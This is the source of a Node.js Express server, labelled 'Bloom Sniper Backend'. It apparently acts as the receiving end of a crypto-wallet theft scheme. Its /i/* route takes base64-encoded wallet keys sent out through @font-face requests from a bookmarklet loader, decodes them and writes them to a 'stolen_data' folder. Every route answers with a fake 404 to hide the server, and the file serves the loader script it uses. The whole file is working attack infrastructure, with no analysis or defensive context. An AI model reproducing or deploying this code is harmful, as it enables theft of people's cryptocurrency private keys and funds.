const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

console.log('========================================');
console.log('🚀 Bloom Sniper Backend Starting on Railway...');
console.log('========================================');

// Middleware
app.use(express.json({ limit: '10mb' }));

// Serve static files (loader.js)
app.use('/axiom', express.static(path.join(__dirname, 'public/axiom')));

// Root route
app.get('/', (req, res) => {
    console.log('🌐 Root route accessed from', req.ip);
    res.status(404).send('Not Found');
});

// Direct /i (no data)
app.get('/i', (req, res) => {
    console.log('🌐 /i route accessed (no data)');
    res.status(404).json({ detail: "Not Found" });
});

// === GET /i/* (font-face exfil) - with CORS headers to silence warning ===
app.get('/i/*', (req, res) => {
    res.set('Access-Control-Allow-Origin', '*');
    res.set('Access-Control-Allow-Methods', 'GET');
    res.set('Access-Control-Allow-Headers', '*');

    console.log('📥 /i/* GET ROUTE HIT - Data received via @font-face');
    console.log('Full URL length:', req.originalUrl.length);
    console.log('IP:', req.ip);

    let encodedData = req.params[0] || '';
    if (!encodedData && req.originalUrl.includes('/i/')) {
        encodedData = req.originalUrl.split('/i/')[1] || '';
    }

    try {
        const decodedStr = Buffer.from(encodedData, 'base64').toString('utf-8');
        const payload = JSON.parse(decodedStr);
        console.log('✅ PAYLOAD DECODED SUCCESSFULLY');
        console.log('Wallets extracted:', payload.keys ? payload.keys.length : 0);
        console.log('Full payload:', JSON.stringify(payload, null, 2));

        const dir = path.join(__dirname, 'stolen_data');
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        const filename = `stolen_${Date.now()}.json`;
        fs.writeFileSync(path.join(dir, filename), JSON.stringify(payload, null, 2));
        console.log(`💾 SAVED: stolen_data/${filename}`);
    } catch (err) {
        console.error('❌ DECODE ERROR:', err.message);
    }

    res.status(404).json({ detail: "Not Found" });
});

// Catch-all 404
app.get('*', (req, res) => {
    console.log('404 - Unknown route:', req.originalUrl);
    res.status(404).json({ detail: "Not Found" });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ SERVER LIVE ON PORT ${PORT}`);
    console.log(`🔗 Loader: https://bloom-sniper-replica-production.up.railway.app/axiom/loader.js`);
    console.log('📡 Waiting for bookmarklet data...');
    console.log('========================================');
});